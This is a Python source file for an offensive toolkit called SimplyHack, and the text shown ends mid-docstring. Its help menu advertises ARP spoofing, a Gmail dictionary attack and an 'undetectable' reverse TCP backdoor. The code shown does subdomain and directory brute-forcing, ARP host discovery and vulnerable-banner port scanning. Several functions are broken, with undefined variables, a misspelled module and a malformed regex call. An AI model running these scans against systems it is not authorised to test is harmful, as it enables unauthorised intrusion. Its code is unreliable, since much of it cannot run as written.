#!/usr/bin/env python3

# Package Name             : SimplyHack
# Version                  : 0.0.10
# Author                   : Abhishek Dangat
# Programming Language     : Python 3.9.7
# Contact                  :
# Usage                    : To create cybersecurity tools quickly and easily

import subprocess
import time
import re
import socket
import os
import sys
import threading
import requests
import hashlib
import urllib.parse
import urllib.request
import smtplib
import random
import zipfile
import rarfile
import pikepdf
import json
import glob
import scapy.all as scapy
from colorama import Fore, Style
from scapy.layers import http
from threading import *

red         = Fore.RED
lightred    = Fore.LIGHTRED_EX
green       = Fore.GREEN
lightgreen  = Fore.LIGHTGREEN_EX
yellow      = Fore.YELLOW
lightyellow = Fore.LIGHTYELLOW_EX
reset       = Style.RESET_ALL

def protocols_portNumbers(protocol):
    if protocol == "ftp": #File Transfer Protocol
        return 21
    elif protocol == "tftp": #Trivial File Transfer Protocol
        return 69
    elif protocol == "sftp": #Secure File Transfer Protocol
        return 989
    elif protocol == "ssh": #Secure Shell
        return 22
    elif protocol == "telnet": #Teletype Network Protocol
        return 23
    elif protocol == "smtp": #Simple Main Transfer Protocol
        return 25
    elif protocol == "ipsec": #IP Security
        return 50
    elif protocol == "dns": #Domain Naming System
        return 53
    elif protocol == "dhcp": #Dynamic Host Configuration Protocol
        return 67
    elif protocol == "http": #Hyper Text Transfer Protocol
        return 80
    elif protocol == "https": #Hyprt Text Transfer Protocol Secure
        return 443
    elif protocol == "pop3": #Post Office Protocol 3
        return 110
    elif protocol == "nntp": #Network News Transfer Protocol
        return 119
    elif protocol == "ntp": #Network Time Protocol
        return 123
    elif protocol == "netbios": #Network Basic Input/Output System
        return 135
    elif protocol == "imap4": #Internet Message Access Protocol 4
        return 143
    elif protocol == "snmp": #Simple Network Management Protocol
        return 161
    elif protocol == "ldap": #Lightweight Directory Access Protocol
        return 398
    elif protocol == "rdp": #Remote Desktop Protocol
        return 3389

#def help():
#    print(""[subdomain scanning] - simplyhack.subdomain_scanner(domain="example.com", protocol="http/https", wordlist="default"/wordlist="wordlist.txt")
#
#[directory discovery] - simplyhack.directory_scanner(domain="example.com", wordlist="default"/wordlist="wordlist.txt")
#
#[DNS lookup] - simplyhack.dns_lookup(url="exapmle.com")
#
#[reverse DNS lookup] - simplyhack.reverse_dns_lookup(ip="xxx.xxx.xxx.xxx")
#
#[web vuln scanner] - simplyhack.web_vuln_scan(domain="http://www.example.com")
#
#[local network scanner] - simplyhack.local_scan(targetIP="192.168.2.1/24")
#
#[port vuln scanner] - simplyhack.port_vulnscan(ip="192.168.2.") DO NOT INCLUDE THE LAST DIGITS OF THE IP
#
#[detect network attacks] - simplyhack.detect_net_attack(interface="wlan0/eth0/etc")
#
#[MITM (ARP spoof)] - simplyhack.arp_spoof(routerIP="192.168.2.1", targetIP="192.168.2.201")
#
#[MITM (packet sniffing)] - simplyhack.sniff_packets(interface="wlan0/wlan1/eth0/etc")
#
#[Password cracking] - simplyhack.hash_crack(hash_type="sha1/sha224/sha256/sha512/md5", passwordHash="Your password hash here", wordlist="default(if you want to use default wordlist)" or specify path wordlist="/xxx/xxx/xxx/xxx/wordlist.txt")"")""

def help():
    print("\n[" + lightred + "Reconnaissance" + reset + "]")
    print("\n[" + lightgreen + "1" + reset + "] - [" + lightgreen + "Subdomain Scanning" + reset + "] - simplyhack.subdomain_scan(" + lightgreen + "domain" + reset + "=" + lightred + '"example.com"' + reset + ", " + lightgreen + "protocol" + reset + "=" + lightred + '"http"' + reset + "/" + lightred + '"https"' + reset + ", " + lightgreen + "wordlist" + reset + "=" + lightred + '"default"' + reset + " OR " + lightgreen + "wordlist" + reset + "=" + lightred + '"wordlist.txt"' + reset + ")")
    print("[" + lightgreen + "2" + reset + "] - [" + lightgreen + "Directory Discovery" + reset + "] - simplyhack.directory_scan(" + lightgreen + "domain" + reset + "=" + lightred + '"example.com"' + reset + ", " + lightgreen + "wordlist" + reset + "=" + lightred + '"default"' + reset + " OR " + lightred + '"wordlist.txt"' + reset + ")")
    print("[" + lightgreen + "3" + reset + "] - [" + lightgreen + "Web Spider" + reset + "] - simplyhack.web_spider(" + lightgreen + "url" + reset + "=" + lightred + '"<target URL>"' + reset + ")")
    print("[" + lightgreen + "4" + reset + "] - [" + lightgreen + "DNS Lookup" + reset + "] - simplyhack.dns_lookup(" + lightgreen + "url" + reset + "=" + lightred + '"example.com"' + reset + ")")
    print("[" + lightgreen + "5" + reset + "] - [" + lightgreen + "Reverse DNS Lookup" + reset + "] - simplyhack.reverse_dns_lookup(" + lightgreen + "ip" + reset + "=" + lightred + '"<target IPv4>"' + reset + ")")
    print("[" + lightgreen + "6" + reset + "] - [" + lightgreen + "Local Network Scanning" + reset + "] - simplyhack.local_scan(" + lightgreen + "targetIP" + reset + "=" + lightred + '"<target IPv4>"' + reset + ")")

    print("\n\n\n[" + lightred + "Network Attacks" + reset + "]")
    print("\n[" + lightgreen + "1" + reset + "] - [" + lightgreen + "MITM (ARP Spoofing)" + reset + "] - simplyhack.arp_spoof(" + lightgreen + "routerIP" + reset + "=" + lightred + '"<router IPv4>"' + reset + ", " + lightgreen + "targetIP" + reset + "=" + lightred + '"<target IPv4>"' + reset + ")")
    print("[" + lightgreen + "2" + reset + "] - [" + lightgreen + "MITM (Packet Sniffing)" + reset + "] - simplyhack.sniff_packets(" + lightgreen + "interface" + reset + "=" + lightred + '"<your interface>"' + reset + ")")
    print("[" + lightgreen + "3" + reset + "] - [" + lightgreen + "Local Network Scanning" + reset + "] - simplyhack.local_scan(" + lightgreen + "targetIP" + reset + "=" + lightred + '"<target IPv4>"' + reset + ")")
    print("[" + lightgreen + "4" + reset + "] - [" + lightgreen + "MAC Changer" + reset + "] - simplyhack.change_mac_address(" + lightgreen + "interface" + reset + "=" + lightred + '"<Your Interface>"' + reset + ", " + lightgreen + "new_mac" + reset + "=" + lightred + '"rand OR <new MAC>"' + reset + ", " + lightgreen + "ischeck" + reset + "=" + lightred + '"TRUE/FALSE"' + reset + ")")
    
    print("\n\n\n[" + lightred + "Defense" + reset + "]")
    print("\n[" + lightgreen + "1" + reset + "] - [" + lightgreen + "Network Intrusion Detection System (IDS)" + reset + "] - simplyhack.network_ids(" + lightgreen + "interface" + reset + "=" + lightred + '"<your interface>"' + reset + ")")
    print("[" + lightgreen + "2" + reset + "] - [" + lightgreen + "Endpoint Intrusion Detection System (IDS)" + reset + "] - simplyhack.endpoint_ids()")

    print("\n\n\n[" + lightred + "Password Cracking" + reset + "]")
    print("\n[" + lightgreen + "1" + reset + "] - [" + lightgreen + "Hash Cracker" + reset + "] - simplyhack.hash_crack(" + lightgreen + "hash_type" + reset + "=" + lightred + '"sha1/sha224/sha256/sha512/md5"' + reset + ", " + lightgreen + "passwordHash" + reset + "=" + lightred + '"<Password Hash>"' + reset + ", " + lightgreen + "wordlist" + reset + "=" + lightred + '"default"' + reset + " OR " + lightgreen + "wordlist" + reset + "=" + lightred + '"wordlist.txt"' + reset + ")")
    print("[" + lightgreen + "2" + reset + "] - [" + lightgreen + "Crack password protected files" + reset + "] - simplyhack.crack_passprotected(" + lightgreen + "filetype" + reset + "=" + lightred + '"<file type>"' + reset + ", " + lightgreen + "file_path" + reset + "=" + lightred + '"/xxx/xxx/xxx/file.zip/.pdf"' + reset + ", " + lightgreen + "wordlist" + reset + "=" + lightred + '"default"' + reset + " OR " + lightgreen + "wordlist" + reset + "=" + lightred + '"wordlist.txt"' + reset + ")")
    print("[" + lightgreen + "3" + reset + "] - [" + lightgreen + "Gmail Dictionary Attack" + reset + "] - simplyhack.gmail_dictatk(" + lightgreen + "target_gmail" + reset + "=" + lightred + '"example@gmail.com"' + reset + ", " + lightgreen + "wordlist" + reset + "=" + lightred + '"default"' + reset + " OR " + lightgreen + "wordlist" + reset + "=" + lightred + '"wordlist.txt"' + reset + ")")
    
    print("\n\n\n[" + lightred + "Vulnerability Discovery" + reset + "]")
    print("\n[" + lightgreen + "1" + reset + "] - [" + lightgreen + "Web Vulnerability Scanner" + reset + "] - simplyhack.web_vuln_scan(" + lightgreen + "domain" + reset + "=" + lightred + '"example.com"' + reset + ")")
    print("[" + lightgreen + "2" + reset + "] - [" + lightgreen + "Network Vulnerability Scanner" + reset + "] - simplyhack.port_vulnscan(" + lightgreen + "ip" + reset + "=" + lightred + '"<target IP or IP range>"' + reset + ")")
    
    print("\n\n\n[" + lightred + "Gaining Access" + reset + "]")
    print("\n[" + lightgreen + "1" + reset + "] - [" + lightgreen + "Undetectable reverse_tcp Backdoor" + reset + "] - simplyhack.backdoor_client(" + lightgreen + "server_ip" + reset + "=" + lightred + '"<server IPv4>"' + reset + ", " + lightgreen + "server_port" + reset + "=" + lightred + '<port>' + reset + ")")
    print("[" + lightgreen + "2" + reset + "] - [" + lightgreen + "Undetectable reverse_tcp Backdoor" + reset + "] - simplyhack.backdoor_server(" + lightgreen + "server_ip" + reset + "=" + lightred + '"<server IPv4>"' + reset + ", " + lightgreen + "server_port" + reset + "=" + lightred + '<port>' + reset + ")")

def get_ownMAC(interface):
    IFCONFIG_SEARCH_RESULT = subprocess.check_output(["sudo", "ifconfig", interface]).decode()
    MAC_ADDRESS_CHECK_IFCONFIG_RESULTS = re.search(r"\w\w:\w\w:\w\w:\w\w:\w\w:\w\w", IFCONFIG_SEARCH_RESULTS)
    
    return MAC_ADDRESS_CHECK_IFCONFIG_RESULTS

def get_ownIPv4(interface):
    IFCONFIG_SEARCH_IP_RESULTS = subprocess.check_output(["sudo", "ifconfig", interface]).decode()
    IPv4_ADDRESS_CHECK_FROM_IFCONFIG_RESULTS = re.search(r"\d\d\d.\d\d\d.\d\d.\d\d")

    return IPv4_ADDRESS_CHECK_FROM_IFCONFIG_RESULTS

def get_TargetMAC_Address(targetIP):
    arpRequest = scapy.ARP(pdst=targetIP)
    requestBroadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arpRequestToBroadcast = requestBroadcast/arpRequest
    listOfAnsweredRequests = scapy.srp(arpRequestToBroadcast, timeout=1, verbose=False)[0]

    return listOfAnsweredRequests[0][1].hwsrc

def GET_HTTP_RESPONSE(domainToCheck):
    try:
        return requests.get(domainToCheck)
    except requests.exceptions.ConnectionError:
            pass

def subdomain_scan(domain, protocol, wordlist):
    if wordlist == "default":
        subdomainWordlist = str(urllib.request.urlopen("https://raw.githubusercontent.com/danTaler/WordLists/master/Subdomain.txt").read(), 'utf-8')
        for singleSubdomainKeyword in subdomainWordlist:
            strippedSingleSubdomainKeyword = singleSubdomainKeyword.strip()
            completeURL = protocol + "://" + strippedSingleSubdomainKeyword + "." + domain
            HTTP_RESPONSE = GET_HTTP_RESPONSE(completeURL)
            if HTTP_RESPONSE:
                print("[" + lightgreen + "SUBDOMAIN DISCOVERED" + reset + f"] -----> {completeURL}")
    else:
        with open(wordlist) as subdomainWordlist:
            for singleSubdomainKeyword in subdomainWordlist:
                strippedSingleSubdomainKeyword = singleSubdomainKeyword.strip()
                domainURL_withoutSUB = protocol + "://" + domain
                completeURL = protocol + '://' + strippedSingleSubdomainKeyword + "." + domain
                HTTP_RESPONSE = GET_HTTP_RESPONSE(completeURL)
                if HTTP_RESPONSE:
                    print("[" + lightgreen + "SUBDOMAIN DISCOVERED" + reset + f"] -----> {completeURL}")

def directory_scan(domain, protocol, wordlist):
    if wordlist == "default":
        directoryWordlist = str(urrlib.requests.urlopen("https://raw.githubusercontent.com/xmendez/wfuzz/master/wordlist/general/common.txt").read(), 'utf-8')
        for singleDirectoryKeyword in directoryWordlist:
            strippedSingleDirectoryKeyword = singleDirectoryKeyword.strip()
            domainNameDIR = protocol + "://" + domain + "/" + strippedSingleDirectoryKeyword
            HTTP_RESPONSE_DOMAIN = GET_HTTP_RESPONSE(domainNameDIR)
            if HTTP_RESPONSE_DOMAIN:
                    print(f"[{lightgreen}DISCOVERED DIRECTORY{reset}] -----> {domainName}")
    else:
        with open(wordlist) as directoryWordlist:
            for singleDirectoryKeyword in directoryWordlist:
                strippedSingleDirectoryKeyword = singleDirectoryKeyword.strip()
                domainNameDIR = domain + "/" + strippedSingleDirectoryKeyword
                HTTP_RESPONSE_DOMAIN    = GET_HTTP_RESPONSE(domainNameDIR)
                if HTTP_RESPONSE_DOMAIN:
                    print(f"[{lightgreen}DISCOVERED DIRECTORY{reset}] -----> {domainName}")

def dns_lookup_web_vuln(url):
    addressofDNS_URL = socket.gethostbyname(url)
    return str(addressofDNS_URL)

def reverse_dns_lookup_web_vuln(ip):
    strIPv4 = str(ip)
    addressofDNS_URL = socket.gethostbyaddr(ip)[0]
    return str(addressofDNS_URL)

def dns_lookup(url):
    addressof_DNS_URL = socket.gethostbyname(url)
    print("[" + lightgreen + "DNS results" + reset + "] = " + str(addressof_DNS_URL))

def reverse_dns_lookup(ip):
    addressof_RDNS_URL = socket.gethostbyaddr(ip)[0]
    print("[" + lightgreen + "RDNS results" + reset + "] = " + addressof_RDNS_URL)

def GET_RESPONSE(targetURL):
    try:
        #HTTP_GET_RESPONSE = requests.get("http://" + url)
        #print(HTTP_GET_RESPONSE)
        return requests.get("http://" + targetURL)
    except requests.exceptions.ConnectionError:
        pass

def web_spider(url):
    unique_links_list = []
    HTTP_GET_RESPONSE = GET_RESPONSE(url)
    content = HTTP_GET_RESPONSE.content
    decoded_content = content.decode('utf-8')
    unique_links = re.findall('(?:href=")(.*?)"', decoded_content)
    #print(unique_links)
    #for single_unique_link in unique_links:
        #print(single_unique_link)
    for singleUniqueLink in unique_links:
        joinedLINK = urllib.parse.urljoin(url, singleUniqueLink)
        if "#" in joinedLINK:
            joinedLINK.split("#")[0]
        if url in joinedLINK and joinedLINK not in unique_links_list:
            unique_links_list.append(joinedLINK)
            print("[" + lightgreen + "Discovered Link" + reset + "] -----> [" + joinedLINK + reset + "]")
            time.sleep(0.05)
            #web_spider(url=joinedLINK)
        #print(joinedLINK)

def web_vuln_scan(domain):
    unique_links_list = []
    HTTP_GET_RESPONSE = GET_RESPONSE(domain)
    content = HTTP_GET_RESPONSE.content
    decoded_content = content.decode('utf-8')
    unique_links = re.findall('(?:href=")(.*?)"', decoded_content)
    #print(unique_links)
    #for single_unique_link in unique_links:
        #print(single_unique_link)
    print("\n[" + lightgreen + "*" + reset + "] Discovering unique paths\n")
    time.sleep(2)
    for singleUniqueLink in unique_links:
        joinedLINK = urllib.parse.urljoin(domain, singleUniqueLink)
        if "#" in joinedLINK:
            joinedLINK.split("#")[0]
        if domain in joinedLINK and joinedLINK not in unique_links_list:
            unique_links_list.append(joinedLINK)
            print("[" + lightgreen + "Discovered Link" + reset + "] -----> [" + joinedLINK + reset + "]")
            time.sleep(0.06)
            #web_spider(url=joinedLINK)
        #print(joinedLINK)

    FLAWS_FOUND_INFO = {"HTTP":"Vulnerable to packet sniffing and other threats",
         "Strict-Transport-Security":"HTTP Strict Transport Security is an excellent feature to support on your site and strengthens your implementation of TLS by getting the User Agent to enforce the use of HTTPS. Recommended value Strict-Transport-Security: max-age=31536000; includeSubDomains",
         "X-Frame-Options":"X-Frame-Options tells the browser whether you want to allow your site to be framed or not. By preventing a browser from framing your site you can defend against attacks like clickjacking. Recommended value X-Frame-Options: SAMEORIGIN",
         "X-Content-Type-Options":"X-Content-Type-Options stops a browser from trying to MIME-sniff the content type and forces it to stick with the declared content-type. The only valid value for this header is X-Content-Type-Options: nosniff",
         "Content-Security-Policy":"Content Security Policy is an effective measure to protect your site from XSS attacks. By whitelisting sources of approved content, you can prevent the browser from loading malicious assets.",
         "Referrer-Policy":"Referrer Policy is a new header that allows a site to control how much information the browser includes with navigations away from a document and should be set by all sites.",
         "Permissions-Policy":"Permissions Policy is a new header that allows a site to control which features and APIs can be used in the browser."}

    MISSING_SECURITY_HEADERS = []
    PRESENT_SECURITY_HEADERS = []
    #UNIQUE_LINKS_LIST = unique_links_list
    FINAL_UNIQUE_LINKS_LIST = unique_links_list.append(domain)
    URL_HTTP_HTTPS = 0
    unique_links_list.append(domain)
    #print(unique_links_list)

    #print(FINAL_UNIQUE_LINKS_LIST)

    try:
        for singleUniqueLink in unique_links_list:
            DOMAIN_SECURITY_HEADERS = requests.get(singleUniqueLink).headers
            time.sleep(1)
            print("\n\n\n[" + lightgreen + "*" + reset + "] Testing [" + lightgreen + singleUniqueLink + reset + "]")
            time.sleep(1)
            print("\n[" + lightgreen + "*" + reset + "] Checking for missing security headers\n")
            if "https" in domain:
                URL_HTTP_HTTPS=1

            if "Strict-Transport-Security" in DOMAIN_SECURITY_HEADERS:
                PRESENT_SECURITY_HEADERS.append("Strict-Transport-Security")
            else:
                MISSING_SECURITY_HEADERS.append("Strict-Transport-Security")

            if "X-Frame-Options" in DOMAIN_SECURITY_HEADERS:
                PRESENT_SECURITY_HEADERS.append("X-Frame-Options")
            else:
                MISSING_SECURITY_HEADERS.append("X-Frame-Options")

            if "X-Content-Type-Options" in DOMAIN_SECURITY_HEADERS:
                PRESENT_SECURITY_HEADERS.append("X-Content-Type-Options")
            else:
                MISSING_SECURITY_HEADERS.append("X-Content-Type-Options")

            if "Content-Security-Policy" in DOMAIN_SECURITY_HEADERS:
                PRESENT_SECURITY_HEADERS.append("Content-Security-Policy")
            else:
                MISSING_SECURITY_HEADERS.append("Content-Security-Policy")

            if "Referrer-Policy" in DOMAIN_SECURITY_HEADERS:
                PRESENT_SECURITY_HEADERS.append("Referrer-Policy")
            else:
                MISSING_SECURITY_HEADERS.append("Referrer-Policy")

            if "Permissions-Policy" in DOMAIN_SECURITY_HEADERS:
                PRESENT_SECURITY_HEADERS.append("Permissions-Policy")
            else:
                MISSING_SECURITY_HEADERS.append("Permissions-Policy")

            for SINGLE_MISSING_SECURITY_HEADER in MISSING_SECURITY_HEADERS:
                time.sleep(1)
                print("[" + Fore.LIGHTRED_EX + "Missing" + Style.RESET_ALL + "] ---> [" + Fore.LIGHTRED_EX + SINGLE_MISSING_SECURITY_HEADER + Style.RESET_ALL + "] ---> [" + FLAWS_FOUND_INFO[SINGLE_MISSING_SECURITY_HEADER] + "]")
            time.sleep(2)
            print("\n\n\n==========================================================================================")
            print("[" + lightgreen + "VULNERABILITY REPORT" + reset + "] for : " + lightgreen + singleUniqueLink + reset)
            print("==========================================================================================")
            time.sleep(2)
            print("\n\n[" + lightgreen + "BASIC INFO" + reset + "] :")
            time.sleep(1)
            print("\n[" + lightgreen + "URL" + reset + "] = " + singleUniqueLink)
            time.sleep(1)
            regEx_pattern = '<title>(.+?)</title>'
            regEx_compailation_results = re.compile(regEx_pattern)
            HTML_SOURCE = urllib.request.urlopen(singleUniqueLink)
            HTML_TEXT = str(HTML_SOURCE.read())
            singleUniqueLink_title = re.findall(regEx_compailation_results, HTML_TEXT)
            stripped_title = singleUniqueLink_title[0].strip("['")
            final_stripped_title = stripped_title.strip("']")
            print("[" + lightgreen + "Title" + reset + "] = " + final_stripped_title)
            time.sleep(1)
            if "https://" in singleUniqueLink:
                print("[" + lightgreen + "DNS lookup" + reset + "] = " + dns_lookup_web_vuln(singleUniqueLink.strip("https://")))
            elif "http://" in singleUniqueLink:
                print("[" + lightgreen + "DNS lookup" + reset + "] = " + dns_lookup_web_vuln(singleUniqueLink.strip("http://")))
            time.sleep(1)
            if "https://" in singleUniqueLink:
                print("[" + lightgreen + "RDNS lookup" + reset + "] = " + reverse_dns_lookup_web_vuln(dns_lookup_web_vuln(url=singleUniqueLink.strip("https://"))))
            elif "http://" in singleUniqueLink:
                print("[" + lightgreen + "RDNS lookup" + reset + "] = " + reverse_dns_lookup_web_vuln(dns_lookup_web_vuln(url=singleUniqueLink.strip("http://"))))
            time.sleep(1)
            singleUniqueLink_SERVER = requests.get(singleUniqueLink)
            print("[" + lightgreen + "Server" + reset + "] = " + singleUniqueLink_SERVER.headers['Server'])
            time.sleep(1)
            if 'X-Powered-By' in singleUniqueLink_SERVER.headers:
                print("[" + lightgreen + "Backend" + reset + "] = " + singleUniqueLink_SERVER.headers['X-Powered-by'])
                time.sleep(1)
            else:
                print("[" + lightgreen + "Backend" + reset + "] = " + lightred + "No Info available" + reset)
                time.sleep(1)
            """    
            HTTP_CONNECTION = HTTPConnection(singleUniqueLink)
            if HTTP_CONNECTION.request('HEAD', '/') is not None:
                print(HTTP_CONNECTION._sock._sck.version())
            """
            print("[" + lightgreen + "Content Type" + reset + "] = " + singleUniqueLink_SERVER.headers['Content-Type'])
            time.sleep(1)
            print("[" + lightgreen + "Domain Expiry Date" + reset + "] = " + singleUniqueLink_SERVER.headers['Date'])
            time.sleep(1)
            ipgeolocationAPI_URL = 'http://ip-api.com/json/'
            """
            if "https://" in singleUniqueLink:
                stripped_protocol_singleUniqueLink = singleUniqueLink.strip("https://")
                if "/" in stripped_protocol_singleUniqueLink:
                    final_stripped_URL = stripped_protocol_singleUniqueLink.strip("/")
            """
            targetIPv4ToLocate = dns_lookup_web_vuln(domain)
            urllibRequest = urllib.request.Request(ipgeolocationAPI_URL + targetIPv4ToLocate)
            urllibResponse = urllib.request.urlopen(urllibRequest).read()
            JSON_RESPONSE = json.loads(urllibResponse.decode('utf-8'))
            print("[" + lightgreen + "Country" + reset + "] = " + JSON_RESPONSE['country'])
            time.sleep(1)
            print("[" + lightgreen + "Region" + reset + "] = " + JSON_RESPONSE['regionName'])
            time.sleep(1)
            print("[" + lightgreen + "City" + reset + "] = " + JSON_RESPONSE['city'])
            time.sleep(1)
            print("[" + lightgreen + "Time Zone" + reset + "] = " + JSON_RESPONSE['timezone'])
            time.sleep(1)
            print("[" + lightgreen + "Service Provider" + reset + "] = " + JSON_RESPONSE['isp'])
            time.sleep(1)
            print("\n[" + lightgreen + "MISSING SECURITY HEADERS" + reset + "] {\n")
            for singleMissingSecurityHeader in MISSING_SECURITY_HEADERS:
                print("    " + singleMissingSecurityHeader + reset)
                time.sleep(0.5)
            print("\n}")
            MISSING_SECURITY_HEADERS.clear()
            time.sleep(1)
            print("\n==========================================================================================")
            time.sleep(2)
    except requests.exceptions.MissingSchema:
        pass
    except KeyboardInterrupt:
        print("\n[" + lightred + "EXITING" + reset + "]")
    except socket.gaierror:
        pass
    except IndexError:
        pass


"""
    DOMAIN_SECURITY_HEADERS = requests.get(domain).headers
    if "https" in domain:
        URL_HTTP_HTTPS=1

    if "Strict-Transport-Security" in DOMAIN_SECURITY_HEADERS:
        PRESENT_SECURITY_HEADERS.append("Strict-Transport-Security")
    else:
        MISSING_SECURITY_HEADERS.append("Strict-Transport-Security")

    if "X-Frame-Options" in DOMAIN_SECURITY_HEADERS:
        PRESENT_SECURITY_HEADERS.append("X-Frame-Options")
    else:
        MISSING_SECURITY_HEADERS.append("X-Frame-Options")

    if "X-Content-Type-Options" in DOMAIN_SECURITY_HEADERS:
        PRESENT_SECURITY_HEADERS.append("X-Content-Type-Options")
    else:
        MISSING_SECURITY_HEADERS.append("X-Content-Type-Options")

    if "Content-Security-Policy" in DOMAIN_SECURITY_HEADERS:
        PRESENT_SECURITY_HEADERS.append("Content-Security-Policy")
    else:
        MISSING_SECURITY_HEADERS.append("Content-Security-Policy")

    if "Referrer-Policy" in DOMAIN_SECURITY_HEADERS:
        PRESENT_SECURITY_HEADERS.append("Referrer-Policy")
    else:
        MISSING_SECURITY_HEADERS.append("Referrer-Policy")

    if "Permissions-Policy" in DOMAIN_SECURITY_HEADERS:
        PRESENT_SECURITY_HEADERS.append("Permissions-Policy")
    else:
        MISSING_SECURITY_HEADERS.append("Permissions-Policy")

    for SINGLE_MISSING_SECURITY_HEADER in MISSING_SECURITY_HEADERS:
        time.sleep(1)
        print("\n[" + Fore.LIGHTRED_EX + "Missing" + Style.RESET_ALL + "] ---> [" + Fore.LIGHTRED_EX + SINGLE_MISSING_SECURITY_HEADER + Style.RESET_ALL + "] ---> [" + FLAWS_FOUND_INFO[SINGLE_MISSING_SECURITY_HEADER] + "]")
"""
def local_scan(targetIP):
    try:
        if targetIP:
            if len(targetIP)<=18:
                arp_request = scapy.ARP()
                arp_request.pdst=targetIP
                arp_requestBroadcast = scapy.Ether()
                arp_requestBroadcast.dst ="ff:ff:ff:ff:ff:ff"
                finalBroadcast = arp_requestBroadcast/arp_request
                responsePacketsAnsweredList = scapy.srp(finalBroadcast, timeout=1, verbose=False)[0]
                if responsePacketsAnsweredList:
                    print("\n[" + lightgreen + "*" + reset + "] [" + lightgreen + "CLIENTS FOUND" + reset + "]")
                    for singleElement in responsePacketsAnsweredList:
                        print(" |")
                        print(" -----> [(" + lightgreen + "IP" + reset + ") => " + lightyellow + singleElement[1].psrc + reset + "] [(" + lightgreen + "MAC" + reset + ") => " + lightyellow + singleElement[1].hwsrc + reset + "]")
                        time.sleep(1)
                else:
                    print("[" + lightred + "-" + reset + "] " + lightred + "We ran into an error :( . Please recheck if the IP address/range you entered is valid" + reset)
            else:
                print("[" + lightred + "-" + reset + "] " + lightred + "Invalid IP format" + reset)
        else:
            print("[" + lightred + "-" + reset + "] " + lightred + "Missing field IP Address in" + lightyellow + " hacker-man.local_scan(IP)" + reset)
    except PermissionError:
        print("\n[" + red + "You must run this as root" + reset + "]")

def scanConnection(targetHost, targetPort):
        socketConnectionObject = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        #socketConnectionObject.setdefaulttimeout(2)
        if socketConnectionObject.connect_ex((targetHost, targetPort)):
            print("[" + lightgreen + f"Port {targetPort}" + reset + "] is" + lightred + " CLOSE" + reset)
            time.sleep(0.5)
        else:
            socketConnectionObject.connect((targetHost, targetPort))
            print("[" + lightgreen + f"Port {targetPort}" + reset + "] is" + lightgreen + " OPEN" + reset)
            time.sleep(0.5)

def bannerGrab(ip, portNum):
    VULNERABLE_BANNERS = [
            "3Com 3CDaemon FTP Server Version 2.0", 
            "Ability Server 2.34",
            "CCProxy Telnet Service Ready",
            "ESMTP TABS Mail Server for Windows NT",
            "FreeFloat Ftp Server (Version 1.00)",
            "IMAP4rev1 MDaemon 9.6.4 ready",
            "MailEnable Service, Version: 0-1.54",
            "NetDecision-HTTP-Server 1.0",
            "PSO Proxy 0.9",
            "SAMBAR  Sami FTP Server 2.0.2",
            "Spipe 1.0",
            "TelSrv 1.5",
            "WDaemon 6.8.5",
            "WinGate 6.1.1",
            "Xitami",
            "YahooPOPs! Simple Mail Transfer Service Ready"
            ]
    try:
        socket.setdefaulttimeout(2)
        socketObject = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        socketObject.connect((ip, portNum))
        banner = socketObject.recv(1024)
        for singleBanner in VULNERABLE_BANNERS:
            if singleBanner in banner:
                return banner
    except:
        return


def port_vulnscan(ip):
    VULNERABLE_BANNERS = [
            "3Com 3CDaemon FTP Server Version 2.0", 
            "Ability Server 2.34",
            "CCProxy Telnet Service Ready",
            "ESMTP TABS Mail Server for Windows NT",
            "FreeFloat Ftp Server (Version 1.00)",
            "IMAP4rev1 MDaemon 9.6.4 ready",
            "MailEnable Service, Version: 0-1.54",
            "NetDecision-HTTP-Server 1.0",
            "PSO Proxy 0.9",
            "SAMBAR  Sami FTP Server 2.0.2",
            "Spipe 1.0",
            "TelSrv 1.5",
            "WDaemon 6.8.5",
            "WinGate 6.1.1",
            "Xitami",
            "YahooPOPs! Simple Mail Transfer Service Ready",
            "SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.8"
            ]

    VULNERABLE_PORTS = [21, 22, 23, 25, 53, 443, 110, 135, 137, 138, 139, 1434, 80, 8080]
    AVAILABLE_CLIENTS = []
    try:
        if ip:
            if len(ip)<=18:
                arpRequest = scapy.ARP()
                arpRequest.pdst=ip
                arpRequestBroadcast = scapy.Ether()
                arpRequestBroadcast.dst = "ff:ff:ff:ff:ff:ff"
                finalBroadcastPacket = arpRequestBroadcast/arpRequest
                responsePacketsAnsweredList = scapy.srp(finalBroadcastPacket, timeout=1, verbose=False)[0]
                if responsePacketsAnsweredList:
                    for singleElement in responsePacketsAnsweredList:
                        AVAILABLE_CLIENTS.append(singleElement[1].psrc)
                else:
                    print("[" + lightred + "-" + reset + "] " + lightred + "We ran into an error :( . Please recheck if the IP address/range you entered is valid" + reset)
            else:
                print("[" + lightred + "-" + reset + "] " + lightred + "Invalid IP format" + reset)
        else:
            print("[" + lightred + "-" + reset + "] " + lightred + "Missing field IP Address in" + lightyellow + " hacker-man.local_scan(IP)" + reset)
    except PermissionError:
        print("\n[" + red + "You must run this as root" + reset + "]")

    print("\n[Clients Online] {\n")
    for singleClient in AVAILABLE_CLIENTS:
        print("    [" + lightgreen + singleClient + reset + "]")
    print("\n}")

    for singleAvailableClient in AVAILABLE_CLIENTS:
        time.sleep(1.5)
        print("\n\nScanning the client [" + lightgreen + singleAvailableClient + reset + "]\n")
        time.sleep(1.5)
        for port in range(1, 1001):
            vulnerableBanner = bannerGrab(singleAvailableClient, port)
            strPort = str(port)
            if vulnerableBanner:
                print("[", lightgreen, "VULNERABLE", reset, "]> [", lightgreen, singleAvailableClient, reset, ":", lightgreen, strPort, reset, "] -----> [", lightgreen, vulnerableBanner, reset, "]")
            else:
                print("[", lightred, "NOT VULNERABLE", reset, "]> [", lightred, singleAvailableClient, reset, ":", lightred, strPort, reset, "] -----> [", lightred, vulnerableBanner, reset, "]")
                time.sleep(0.005)

"""
    for ipLastField in range(1, 255):
        ipAddress = ip + str(ipLastField)
        for port in VULNERABLE_PORTS:
            vulnerableBanner = bannerGrab(ipAddress, port)
            strPort = str(port)
            if vulnerableBanner:
                print("[", lightgreen, "VULNERABLE", reset, "]> [", lightgreen, ipAddress, reset, ":", lightgreen, strPort, reset, "] -----> [", lightgreen, vulnerableBanner, reset, "]")
            else:
                print("[", lightred, "NOT VULNERABLE", reset, "]> [", lightred, ipAddress, reset, ":", lightred, strPort, reset, "] -----> [", lightred, vulnerableBanner, reset, "]")


    sockObject = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    socket.setdefaulttimeout(2)
    for port in range(1, 1000):
